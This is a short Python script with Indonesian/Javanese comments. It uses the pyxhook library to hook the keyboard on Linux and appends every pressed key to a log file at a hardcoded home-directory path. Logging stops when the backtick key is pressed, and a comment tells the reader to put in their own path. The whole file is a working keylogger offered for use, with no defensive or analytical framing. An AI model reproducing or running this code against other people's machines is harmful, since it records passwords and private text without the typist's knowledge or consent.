import pyxhook
#Ganti Path dibawah dengan path klean bro
log_file='/home/sultonexe/Desktop/file.log'

#fungsi iki diceluk setiap kali tombol keyboard dipencet
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: 
    fob.close()
    new_hook.cancel()
    
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
